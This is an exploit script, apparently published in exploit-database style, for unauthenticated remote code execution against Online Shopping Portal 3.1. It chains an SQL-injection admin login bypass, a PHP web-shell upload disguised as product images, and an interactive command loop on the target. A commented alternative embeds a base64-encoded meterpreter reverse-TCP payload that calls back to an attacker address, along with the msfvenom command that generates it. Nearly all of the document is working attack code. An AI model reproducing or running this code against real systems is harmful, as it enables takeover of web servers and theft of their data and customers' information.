#!/usr/bin/python3 env
# Exploit Title: Online Shopping Portal 3.1 - Interactive Remote Code Execution (Unauthenticated)
# Date: 17.07.2021
# Exploit Author: D3duct1V
# Original Exploit Author: Tagoletta (Tağmaç)
# Software Link: https://phpgurukul.com/shopping-portal-free-download/
# Version: V3.1
# Tested on: Ubuntu

import requests
import random
import string
import argparse
import sys

payload= "<?php if(isset($_GET['cmd'])){ echo '<pre>'; $cmd = ($_GET['cmd']); system($cmd); echo '</pre>'; die; } ?>"
# msfvenom -p php/meterpreter/reverse_tcp LHOST=<atk IP> LPORT=<atck port> -e php/base64 -f raw > backdoor.php
# payload = "<?php eval(base64_decode(Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzE5Mi4xNjguNC4yNDQnOyAkcG9ydCA9IDkwMDA7IGlmICgoJGYgPSAnc3RyZWFtX3NvY2tldF9jbGllbnQnKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZigidGNwOi8veyRpcH06eyRwb3J0fSIpOyAkc190eXBlID0gJ3N0cmVhbSc7IH0gaWYgKCEkcyAmJiAoJGYgPSAnZnNvY2tvcGVuJykgJiYgaXNfY2FsbGFibGUoJGYpKSB7ICRzID0gJGYoJGlwLCAkcG9ydCk7ICRzX3R5cGUgPSAnc3RyZWFtJzsgfSBpZiAoISRzICYmICgkZiA9ICdzb2NrZXRfY3JlYXRlJykgJiYgaXNfY2FsbGFibGUoJGYpKSB7ICRzID0gJGYoQUZfSU5FVCwgU09DS19TVFJFQU0sIFNPTF9UQ1ApOyAkcmVzID0gQHNvY2tldF9jb25uZWN0KCRzLCAkaXAsICRwb3J0KTsgaWYgKCEkcmVzKSB7IGRpZSgpOyB9ICRzX3R5cGUgPSAnc29ja2V0JzsgfSBpZiAoISRzX3R5cGUpIHsgZGllKCdubyBzb2NrZXQgZnVuY3MnKTsgfSBpZiAoISRzKSB7IGRpZSgnbm8gc29ja2V0Jyk7IH0gc3dpdGNoICgkc190eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRsZW4gPSBmcmVhZCgkcywgNCk7IGJyZWFrOyBjYXNlICdzb2NrZXQnOiAkbGVuID0gc29ja2V0X3JlYWQoJHMsIDQpOyBicmVhazsgfSBpZiAoISRsZW4pIHsgZGllKCk7IH0gJGEgPSB1bnBhY2so.Ik5sZW4iLCAkbGVuKTsgJGxlbiA9ICRhWydsZW4nXTsgJGIgPSAnJzsgd2hpbGUgKHN0cmxlbigkYikgPCAkbGVuKSB7IHN3aXRjaCAoJHNfdHlwZSkgeyBjYXNlICdzdHJlYW0nOiAkYiAuPSBmcmVhZCgkcywgJGxlbi1zdHJsZW4oJGIpKTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRiIC49IHNvY2tldF9yZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgfSB9ICRHTE9CQUxTWydtc2dzb2NrJ10gPSAkczsgJEdMT0JBTFNbJ21zZ3NvY2tfdHlwZSddID0gJHNfdHlwZTsgaWYgKGV4dGVuc2lvbl9sb2FkZWQoJ3N1aG9zaW4nKSAmJiBpbmlfZ2V0KCdzdWhvc2luLmV4ZWN1dG9yLmRpc2FibGVfZXZhbCcpKSB7ICRzdWhvc2luX2J5cGFzcz1jcmVhdGVfZnVuY3Rpb24oJycsICRiKTsgJHN1aG9zaW5fYnlwYXNzKCk7IH0gZWxzZSB7IGV2YWwoJGIpOyB9IGRpZSgpOw)); ?>"


def setURL():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', help='Target URL, without the trailing "/"')
    args = parser.parse_args()
    url = args.u + "/shopping"
    attackSEQ(url)
    return


def attackSEQ(url):
    global payload
    # Bypass ADMIN login using SQLi
    session = requests.session()
    print("[+] Bypassing Login...\n")
    login_url = url + "/admin/"
    post_data = {"username": "' OR 1=1-- a", "password": '', "submit": ''}
    session.post(login_url, data=post_data)

    # Random Product and Backdoor name generation
    let = string.ascii_lowercase
    shellname = ''.join(random.choice(let) for i in range(15))
    randstr = ''.join(random.choice(let) for i in range(15))

    # Product & Backdoor names
    print("[!] Product name: " + randstr)
    print("[!] Backdoor name:  " + shellname)
    print("\n[+] Uploading Backdoor...")

    post_url = url + "/admin/insert-product.php"

    post_header = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
                   "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryJNYN304wDTnp1QmE",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                   "Referer": url + "/admin/insert-product.php", "Accept-Encoding": "gzip, deflate",
                   "Connection": "close"}

    post_data = "------WebKitFormBoundaryJNYN304wDTnp1QmE\nContent-Disposition: form-data; name=\"category\"\n\n3\n------WebKitFormBoundaryJNYN304wDTnp1QmE\nContent-Disposition: form-data; name=\"subcategory\"\n\n8\n------WebKitFormBoundaryJNYN304wDTnp1QmE\nContent-Disposition: form-data; name=\"productName\"\n\n" + randstr + "\n------WebKitFormBoundaryJNYN304wDTnp1QmE\nContent-Disposition: form-data; name=\"productCompany\"\n\nGlobex\n------WebKitFormBoundaryJNYN304wDTnp1QmE\nContent-Disposition: form-data; name=\"productpricebd\"\n\n12345\n------WebKitFormBoundaryJNYN304wDTnp1QmE\nContent-Disposition: form-data; name=\"productprice\"\n\n1234\n------WebKitFormBoundaryJNYN304wDTnp1QmE\nContent-Disposition: form-data; name=\"productDescription\"\n\nGlobex Special\n------WebKitFormBoundaryJNYN304wDTnp1QmE\nContent-Disposition: form-data; name=\"productShippingcharge\"\n\n99\n------WebKitFormBoundaryJNYN304wDTnp1QmE\nContent-Disposition: form-data; name=\"productAvailability\"\n\nIn Stock\n------WebKitFormBoundaryJNYN304wDTnp1QmE\nContent-Disposition: form-data; name=\"productimage1\"; filename=\"" + shellname + ".php\"\nContent-Type: application/octet-stream\n\n" + payload + "\n------WebKitFormBoundaryJNYN304wDTnp1QmE\nContent-Disposition: form-data; name=\"productimage2\"; filename=\"" + shellname + ".php\"\nContent-Type: application/octet-stream\n\n" + payload + "\n------WebKitFormBoundaryJNYN304wDTnp1QmE\nContent-Disposition: form-data; name=\"productimage3\"; filename=\"" + shellname + ".php\"\nContent-Type: application/octet-stream\n\n" + payload + "\n------WebKitFormBoundaryJNYN304wDTnp1QmE\nContent-Disposition: form-data; name=\"submit\"\n\n\n------WebKitFormBoundaryJNYN304wDTnp1QmE--\n"

    session.post(post_url, headers=post_header, data=post_data)
    # Finding the uploaded backdoor
    request_url = url + "/search-result.php"
    post_data = {"product": randstr, "search": ''}
    shellpath = \
    str(requests.post(request_url, data=post_data).text).split("data-echo=\"admin/productimages")[1].split(".php")[0]
    shell_url = url + "/admin/productimages" + shellpath + ".php"
    print("\n[!] Backdoor Path: " + shell_url)
    # COMMENT out function call if USING a meterpreter payload
    webSHELL(shell_url)
    # UN-COMMENT this line if using a Metasploit payload
    # requests.get(shell_url, verify=False)
    return


def webSHELL(url):
    try:
        getdir = {'cmd': 'echo %CD%'}
        request_cmd = requests.get(url, params=getdir, verify=False)
        status = request_cmd.status_code
        if status != 200:
            print("[!!] Could not connect to the backdoor!")
            request_cmd.raise_for_status()
        print("[+] Successfully connected!")
        print(request_cmd.text)
        while True:
            user_input = input("> ")
            command = {'cmd': user_input}
            request_cmd = requests.get(url, params=command, verify=False)
            resp = request_cmd.text
            print(resp)
    except:
        print("[!!] Exiting!")
        sys.exit(-1)


if __name__ == "__main__":
    setURL()
    raise SystemExit
